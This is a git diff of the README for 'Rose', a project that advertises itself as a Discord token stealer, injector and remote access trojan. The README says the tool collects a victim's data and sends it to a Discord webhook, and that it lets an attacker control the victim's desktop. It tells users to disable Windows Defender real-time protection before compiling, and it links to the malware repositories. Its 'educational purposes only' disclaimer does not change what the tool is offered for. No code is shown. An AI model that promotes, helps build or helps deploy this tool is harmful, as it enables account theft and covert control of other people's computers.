@@ -26,21 +26,22 @@
 
 <div align="center">
     <h1>
-        The Best Discord Grabber, Injector, and RAT
+        The Best Discord Stealer which includes advanced remote access tools and injections
     </h1>
 </div>
 
 <a href="https://discord.gg/">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
 
-### 10/07/2023 - Do **NOT** use the options under the `Get Admin` category. Also do not use `Knight RAT`. We are working hard on solving the issues with these options.
-### 11/06/2023 - Almost everything is working, however, to compile you *must disable real time protection for windows defender*.
-### Encoutered an error while building? Join our [Discord](https://discord.gg/rHdqqqYVzY)! (You will need to send us the .log file which will be created so that we can have a look on your errors.)
+#### 16/07/2023 - All Rose discord servers have been closed because of way too unethical decisions made by our community.
+#### 10/07/2023 - Do **NOT** use the options under the `Get Admin` category. Also do not use `Knight RAT`. We are working hard on solving the issues with these options.
+#### 11/06/2023 - Almost everything is working, however, to compile you *must disable real time protection for windows defender*.
+#### Encoutered an error while building? Join our [Discord](https://discord.gg/)! You will need to send us both .log files which are created while building.
 ### A multipurpose advanced discord token stealer which is using a beautiful UI.
 
-## <a id="description"></a> Description
+## <a id="table"></a> Table of contents
 
-- [Description](#description)
+- [description](#description)
 - [Features](#features)
 - [Discord](https://discord.gg/gz5fUCkw8p)
 - [Setup](#setup)
@@ -52,11 +53,11 @@
 - [Credits](#credits)
 - [License](#lisence)
 
-## <a id="description"></a> Description
+## <a id="description"></a> Little description
 
 Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://github.com/DamagingRose/Rose-RAT). We spent months of work on this amazing project. You won't really find a better tool than Rose!
 
-[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) detects and collects user data from a PC and sends it to a Discord WebHook Api.
+[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) detects and collects user data from a PC and sends it to a Discord WebHook API.
 
 [Rose-RAT](https://github.com/DamagingRose/Rose-RAT) allows the attacker to control a victims desktop and his windows client overall with a beatiful attacker-client where you are able to execute commands from.
 
@@ -159,3 +160,7 @@ The author of this program is not liable for any damage, harm, or legal conseque
 ### Rose Injector is licensed under the <a href="https://mit-license.org/.">MIT License</a>
 
 ### This is for educational purposes only. Use at your own risk. We are not responsible for any of your actions!
+
+<div align=center>
+    <a href="table">Back to to table of contents</a>
+</div>
